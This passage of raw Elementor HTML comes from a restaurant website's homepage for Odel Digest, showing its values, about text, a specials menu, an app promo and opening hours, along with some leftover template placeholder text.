41.7033 40.0811 42.9999C40.0811 44.2965 41.1489 45.3643 42.4455 45.3643C43.7421 45.3643 44.8099 44.2965 44.8099 42.9999C44.8099 41.6906 43.7548 40.6355 42.4455 40.6355ZM42.4455 44.4363C41.6573 44.4363 41.009 43.788 41.009 42.9999C41.009 42.2118 41.6573 41.5635 42.4455 41.5635C43.2336 41.5635 43.8819 42.2118 43.8819 42.9999C43.8819 43.788 43.2336 44.4363 42.4455 44.4363Z" fill="#FF384B"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							Values						</span>
					</h3>
				
									<p class="elementor-icon-box-description">
						Excellence, Authenticity, Inclusivity, Culinary Innovation.					</p>
				
			</div>
			
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2d760ed elementor-align-center elementor-widget elementor-widget-button" data-id="2d760ed" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a class="elementor-button elementor-size-sm" role="button">
						<span class="elementor-button-content-wrapper">
									<span class="elementor-button-text">Discover More</span>
					</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-201d6c0 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="201d6c0" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-ff6d8d9" data-id="ff6d8d9" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-8ac2420 elementor-widget elementor-widget-heading" data-id="8ac2420" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Stay Informed About Special Offers</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-b5fb950 elementor-widget elementor-widget-heading" data-id="b5fb950" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">For Exclusive Deals, Coupons, News and More!</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-df2f310 elementor-widget elementor-widget-text-editor" data-id="df2f310" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							Lorem ipsum dolor sit amet consectetur adipisicing elit. Ipsum necessitatibus maiores accusamus debitis tempore accusantium quas eum delectus explicabo ea incidunt consequuntur velit quia iste, adipisci illo dolore est doloribus!						</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-1b0b8c4 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="1b0b8c4" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-b2a28ba" data-id="b2a28ba" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<section class="elementor-section elementor-inner-section elementor-element elementor-element-9f7eb6c elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="9f7eb6c" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-b88cce1" data-id="b88cce1" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-95e3731 elementor-widget elementor-widget-image" data-id="95e3731" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img decoding="async" width="225" height="300" src="https://odel.co.in/wp-content/uploads/2023/08/odel-digest-restaurant-nagercoil-5rl5arubkr-225x300.jpg" class="attachment-medium size-medium wp-image-4606" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/odel-digest-restaurant-nagercoil-5rl5arubkr-225x300.jpg 225w, https://odel.co.in/wp-content/uploads/2023/08/odel-digest-restaurant-nagercoil-5rl5arubkr.jpg 479w" sizes="(max-width: 225px) 100vw, 225px" />													</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-2091bc4" data-id="2091bc4" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-6924ae6 elementor-widget elementor-widget-image" data-id="6924ae6" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="800" height="450" src="https://odel.co.in/wp-content/uploads/2023/08/IMG_20170826_142830833_HDR-1024x576.jpg" class="attachment-large size-large wp-image-4607" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/IMG_20170826_142830833_HDR-1024x576.jpg 1024w, https://odel.co.in/wp-content/uploads/2023/08/IMG_20170826_142830833_HDR-300x169.jpg 300w, https://odel.co.in/wp-content/uploads/2023/08/IMG_20170826_142830833_HDR-768x432.jpg 768w, https://odel.co.in/wp-content/uploads/2023/08/IMG_20170826_142830833_HDR.jpg 1080w" sizes="(max-width: 800px) 100vw, 800px" />													</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-fd390cb elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="fd390cb" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-2dca9c2" data-id="2dca9c2" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-66ecbc1 elementor-widget elementor-widget-image" data-id="66ecbc1" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="275" height="183" src="https://odel.co.in/wp-content/uploads/2023/08/images.jpeg" class="attachment-large size-large wp-image-4608" alt="" />													</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-e586b86" data-id="e586b86" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-b8c6923 elementor-widget elementor-widget-image" data-id="b8c6923" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="275" height="183" src="https://odel.co.in/wp-content/uploads/2023/08/images-1.jpeg" class="attachment-large size-large wp-image-4609" alt="" />													</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<div class="elementor-element elementor-element-2d449a6 elementor-widget elementor-widget-image" data-id="2d449a6" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="441" height="277" src="https://odel.co.in/wp-content/uploads/2023/08/Group-51.png" class="attachment-large size-large wp-image-4616" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/Group-51.png 441w, https://odel.co.in/wp-content/uploads/2023/08/Group-51-300x188.png 300w" sizes="(max-width: 441px) 100vw, 441px" />													</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-5d9e043" data-id="5d9e043" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-3624134 elementor-widget elementor-widget-heading" data-id="3624134" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">About Us</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-f1af96f elementor-widget elementor-widget-heading" data-id="f1af96f" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Why we are the Best</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-3b7a77e elementor-widget elementor-widget-text-editor" data-id="3b7a77e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>At Odel Digest, we are passionate about delivering an exceptional dining experience that celebrates the diverse and vibrant world of Indian cuisine. With a focus on North and South Indian flavors, we&#8217;ve mastered the art of infusing each dish with a harmonious mix of spices, ensuring that every bite is a celebration of taste and tradition.</p>						</div>
				</div>
				<div class="elementor-element elementor-element-fc226e6 elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="fc226e6" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
				<svg xmlns="http://www.w3.org/2000/svg" width="55" height="55" viewBox="0 0 55 55" fill="none"><rect width="55" height="55" fill="#FFF9F4"></rect><path fill-rule="evenodd" clip-rule="evenodd" d="M30.0996 20.1C30.0996 20.2092 30.0928 20.3169 30.0798 20.4226C34.5754 21.5702 37.8996 25.6468 37.8996 30.5V31.8C37.8996 32.518 37.3176 33.1 36.5996 33.1H18.3996C17.6816 33.1 17.0996 32.518 17.0996 31.8V30.5C17.0996 25.6468 20.4238 21.5702 24.9194 20.4226C24.9064 20.3169 24.8996 20.2092 24.8996 20.1C24.8996 18.6641 26.0636 17.5 27.4996 17.5C28.9356 17.5 30.0996 18.6641 30.0996 20.1Z" fill="#FF384B"></path><path d="M15.8 35.7C15.082 35.7 14.5 36.282 14.5 37C14.5 37.7179 15.082 38.2999 15.8 38.2999H39.2C39.918 38.2999 40.5 37.7179 40.5 37C40.5 36.282 39.918 35.7 39.2 35.7H15.8Z" fill="#FF384B"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							Buffet Service						</span>
					</h3>
				
									<p class="elementor-icon-box-description">
						Qariatureaque ipsa quae a illo inventore
veritatis et quasi architecto					</p>
				
			</div>
			
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6703a0d elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-mobile-position-top elementor-widget elementor-widget-icon-box" data-id="6703a0d" data-element_type="widget" data-widget_type="icon-box.default">
				<div class="elementor-widget-container">
					<div class="elementor-icon-box-wrapper">

						<div class="elementor-icon-box-icon">
				<span  class="elementor-icon elementor-animation-">
				<svg xmlns="http://www.w3.org/2000/svg" width="55" height="56" viewBox="0 0 55 56" fill="none"><rect width="55" height="55" transform="translate(0 0.689941)" fill="#FFF9F4"></rect><path d="M33.4148 29.7614C33.2857 29.3804 32.9536 29.1423 32.5663 29.1423H31.9806V18.1899C31.9806 17.0749 31.1236 16.1899 30.0437 16.1899H19.6214C18.4749 16.1899 17.5 17.1966 17.5 18.3804V35.809C17.5 36.9423 18.51 37.9042 19.5983 37.9042H30.1325C30.2438 37.9042 30.3419 37.9979 30.3336 38.1126C30.3248 38.2332 30.2272 38.2852 30.1129 38.2852H25.9163L29.1214 40.1899H36.5L33.4148 29.7614ZM24.8833 36.9709C24.5882 36.9709 24.3668 36.7424 24.3667 36.4378C24.3667 36.1478 24.6026 35.9042 24.8834 35.9042C25.1785 35.9043 25.3998 36.1329 25.3998 36.4376C25.3905 36.7423 25.1784 36.9709 24.8833 36.9709ZM30.5971 29.1423H28.7847C28.2959 29.1423 27.8808 29.5899 27.8808 30.0947C27.8808 30.5995 28.2959 31.0471 28.7847 31.0471H30.6109V35.0471H18.9757V18.9518H30.5971V29.1423ZM20.9952 22.2531L21.6245 27.3253H23.7262L24.3494 22.2531H21.7771L21.2639 20.4173L20.9829 20.4993L21.4716 22.2468L20.9952 22.2531ZM24.6487 25.2118C24.6487 25.2118 24.5693 24.4738 25.6629 24.4738H27.4042C28.4917 24.4738 28.4184 25.2118 28.4184 25.2118H24.6487ZM28.4122 26.5872C28.4122 26.5872 28.4855 27.3253 27.398 27.3253H25.6629C24.5693 27.3253 24.6487 26.5872 24.6487 26.5872H28.4122ZM24.8136 26.2276C24.6364 26.2276 24.4898 26.0824 24.4898 25.8932C24.4898 25.7102 24.6303 25.5588 24.8136 25.5588H28.2716C28.4488 25.5588 28.5954 25.7039 28.5954 25.8932C28.5954 26.0761 28.4488 26.2276 28.2716 26.2276H24.8136ZM28.6688 28.322H20.8485V27.7101H28.6689L28.6688 28.322Z" fill="#FF384B"></path></svg>				</span>
			</div>
			
						<div class="elementor-icon-box-content">

									<h3 class="elementor-icon-box-title">
						<span  >
							Online Booking						</span>
					</h3>
				
									<p class="elementor-icon-box-description">
						Qariatureaque ipsa quae a illo inventore
veritatis et quasi architecto					</p>
				
			</div>
			
		</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6a6a1fb elementor-widget elementor-widget-button" data-id="6a6a1fb" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
					<div class="elementor-button-wrapper">
			<a class="elementor-button elementor-size-sm" role="button">
						<span class="elementor-button-content-wrapper">
									<span class="elementor-button-text">About Us</span>
					</span>
					</a>
		</div>
				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-51e2c5a elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="51e2c5a" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-3c93916" data-id="3c93916" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-f0c34f2 elementor-widget elementor-widget-heading" data-id="f0c34f2" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Odel Digest</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-0c0b7b6 elementor-widget elementor-widget-heading" data-id="0c0b7b6" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Our Specials</h2>		</div>
				</div>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-e600b62 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="e600b62" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-4736b49" data-id="4736b49" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-28d20d6 elementor-widget elementor-widget-image" data-id="28d20d6" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="800" height="800" src="https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken.webp" class="attachment-large size-large wp-image-4637" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken.webp 1000w, https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken-300x300.webp 300w, https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken-150x150.webp 150w, https://odel.co.in/wp-content/uploads/2023/08/Tandoori-Chicken-768x768.webp 768w" sizes="(max-width: 800px) 100vw, 800px" />													</div>
				</div>
				<div class="elementor-element elementor-element-4dfbd3a elementor-widget elementor-widget-heading" data-id="4dfbd3a" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">TANDOORI CHICKEN FULL</h2>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-b1e9ed3" data-id="b1e9ed3" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-7ac44cc elementor-widget elementor-widget-image" data-id="7ac44cc" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="800" height="800" src="https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-1024x1024.jpg" class="attachment-large size-large wp-image-4638" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-1024x1024.jpg 1024w, https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-300x300.jpg 300w, https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-150x150.jpg 150w, https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken-768x768.jpg 768w, https://odel.co.in/wp-content/uploads/2023/08/best_chicken_lollipop_drums_of_chicken.jpg 1200w" sizes="(max-width: 800px) 100vw, 800px" />													</div>
				</div>
				<div class="elementor-element elementor-element-1d552ac elementor-widget elementor-widget-heading" data-id="1d552ac" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">CHICKEN LOLYPOP</h2>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-e8492e4" data-id="e8492e4" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-0cac94c elementor-widget elementor-widget-image" data-id="0cac94c" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="800" height="493" src="https://odel.co.in/wp-content/uploads/2023/08/veggie-spring-rolls-blog-1024x631.jpg" class="attachment-large size-large wp-image-4639" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/veggie-spring-rolls-blog-1024x631.jpg 1024w, https://odel.co.in/wp-content/uploads/2023/08/veggie-spring-rolls-blog-300x185.jpg 300w, https://odel.co.in/wp-content/uploads/2023/08/veggie-spring-rolls-blog-768x474.jpg 768w, https://odel.co.in/wp-content/uploads/2023/08/veggie-spring-rolls-blog.jpg 1200w" sizes="(max-width: 800px) 100vw, 800px" />													</div>
				</div>
				<div class="elementor-element elementor-element-d162055 elementor-widget elementor-widget-heading" data-id="d162055" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">VEG SPRING ROLL</h2>		</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-db471fa elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="db471fa" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-5affa2a" data-id="5affa2a" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-3888157 elementor-widget elementor-widget-image" data-id="3888157" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="683" height="1024" src="https://odel.co.in/wp-content/uploads/2023/08/Pineapple-Raita-3-683x1024.jpg" class="attachment-large size-large wp-image-4662" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/Pineapple-Raita-3-683x1024.jpg 683w, https://odel.co.in/wp-content/uploads/2023/08/Pineapple-Raita-3-200x300.jpg 200w, https://odel.co.in/wp-content/uploads/2023/08/Pineapple-Raita-3-768x1152.jpg 768w, https://odel.co.in/wp-content/uploads/2023/08/Pineapple-Raita-3.jpg 800w" sizes="(max-width: 683px) 100vw, 683px" />													</div>
				</div>
				<div class="elementor-element elementor-element-cf7bdf5 elementor-widget elementor-widget-heading" data-id="cf7bdf5" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">PINEAPPLE RAITA</h2>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-3f3c839" data-id="3f3c839" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-a3d1e6a elementor-widget elementor-widget-image" data-id="a3d1e6a" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="800" height="800" src="https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala.jpg" class="attachment-large size-large wp-image-4666" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala.jpg 900w, https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala-300x300.jpg 300w, https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala-150x150.jpg 150w, https://odel.co.in/wp-content/uploads/2023/08/QuickPepperEggMasala-768x768.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" />													</div>
				</div>
				<div class="elementor-element elementor-element-4138fdb elementor-widget elementor-widget-heading" data-id="4138fdb" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">EGG PEPPER MASALA</h2>		</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-inner-column elementor-element elementor-element-430fff4" data-id="430fff4" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-9f6d433 elementor-widget elementor-widget-image" data-id="9f6d433" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="800" height="532" src="https://odel.co.in/wp-content/uploads/2023/08/Tawa-Mutton-1-1024x681.jpg" class="attachment-large size-large wp-image-4667" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/Tawa-Mutton-1-1024x681.jpg 1024w, https://odel.co.in/wp-content/uploads/2023/08/Tawa-Mutton-1-300x200.jpg 300w, https://odel.co.in/wp-content/uploads/2023/08/Tawa-Mutton-1-768x511.jpg 768w, https://odel.co.in/wp-content/uploads/2023/08/Tawa-Mutton-1.jpg 1200w" sizes="(max-width: 800px) 100vw, 800px" />													</div>
				</div>
				<div class="elementor-element elementor-element-d845f40 elementor-widget elementor-widget-heading" data-id="d845f40" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">MUTTON TAWA MASALA</h2>		</div>
				</div>
					</div>
		</div>
					</div>
		</section>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-fd2e196 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="fd2e196" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-71a409e" data-id="71a409e" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<section class="elementor-section elementor-inner-section elementor-element elementor-element-9ea54da elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="9ea54da" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-b57a038" data-id="b57a038" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-cb437b5 elementor-widget elementor-widget-heading" data-id="cb437b5" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">About Our Android App and Online Delivery</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-2c0c4d3 elementor-widget elementor-widget-text-editor" data-id="2c0c4d3" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Embracing convenience, Odel Digest brings the flavors of India to your doorstep with our user-friendly Android app. Experience the joy of browsing our menu, placing orders, and tracking deliveries all at your fingertips. Whether you&#8217;re seeking a cozy dinner at home or a feast for a gathering, our online delivery ensures that you don&#8217;t miss out on the Odel experience.</p>						</div>
				</div>
				<div class="elementor-element elementor-element-90a7828 elementor-widget elementor-widget-text-editor" data-id="90a7828" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Come, Join Us on This Flavorful Journey Through India&#8217;s Culinary Heritage!</p>						</div>
				</div>
				<div class="elementor-element elementor-element-3a70f22 elementor-widget elementor-widget-image" data-id="3a70f22" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="300" height="86" src="https://odel.co.in/wp-content/uploads/2023/08/pngwing-2-300x86.png" class="attachment-medium size-medium wp-image-4689" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/pngwing-2-300x86.png 300w, https://odel.co.in/wp-content/uploads/2023/08/pngwing-2-1024x294.png 1024w, https://odel.co.in/wp-content/uploads/2023/08/pngwing-2-768x221.png 768w, https://odel.co.in/wp-content/uploads/2023/08/pngwing-2.png 1332w" sizes="(max-width: 300px) 100vw, 300px" />													</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-1b3c515" data-id="1b3c515" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-66bff1b elementor-widget elementor-widget-image" data-id="66bff1b" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img loading="lazy" decoding="async" width="485" height="1023" src="https://odel.co.in/wp-content/uploads/2023/08/Pixel-7-Pro-Mockup.png" class="attachment-full size-full wp-image-4683" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/Pixel-7-Pro-Mockup.png 485w, https://odel.co.in/wp-content/uploads/2023/08/Pixel-7-Pro-Mockup-142x300.png 142w" sizes="(max-width: 485px) 100vw, 485px" />													</div>
				</div>
					</div>
		</div>
					</div>
		</section>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-5cdfe11 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="5cdfe11" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-e242461" data-id="e242461" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-848c36a elementor-widget elementor-widget-heading" data-id="848c36a" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">We Have Excellent Of Quality
Japanese Food</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-7de2604 elementor-widget elementor-widget-text-editor" data-id="7de2604" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut elit tellus, luctus nec ullamcorper mattis, pulvinar dapibus leo.Lorem ipsum dolor sit, amet consectetur adipisicing elit. Harum a dolor dolorum deserunt facilis<br />impedit mollitia cum laboriosam, ipsa voluptatibus voluptates dignissimos dolores similique animi! Nemo voluptatem a perspiciatis rerum!</p><p><script src="moz-extension://2b701d6f-3089-49c7-a340-beb94fe0b128/js/app.js" type="text/javascript"></script></p>						</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-88de62a" data-id="88de62a" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-fe29c1b elementor-widget elementor-widget-heading" data-id="fe29c1b" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Opening Times</h2>		</div>
				</div>
				<div class="elementor-element elementor-element-a6cc113 elementor-widget elementor-widget-heading" data-id="a6cc113" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h2 class="elementor-heading-title elementor-size-default">Check Availability</h2>		</div>
				</div>
				<section class="elementor-section elementor-inner-section elementor-element elementor-element-3003dab elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3003dab" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-a902a0a" data-id="a902a0a" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-fc9b591 elementor-widget elementor-widget-text-editor" data-id="fc9b591" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>All Day</p>						</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-d1b1e0f" data-id="d1b1e0f" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-c64dba2 elementor-widget elementor-widget-text-editor" data-id="c64dba2" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>11.00 AM &#8211; 10:30 PM</p>						</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<div class="elementor-element elementor-element-5a83142 elementor-widget-divider--view-line elementor-widget elementor-widget-divider" data-id="5a83142" data-element_type="widget" data-widget_type="divider.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.23.0 - 05-08-2024 */
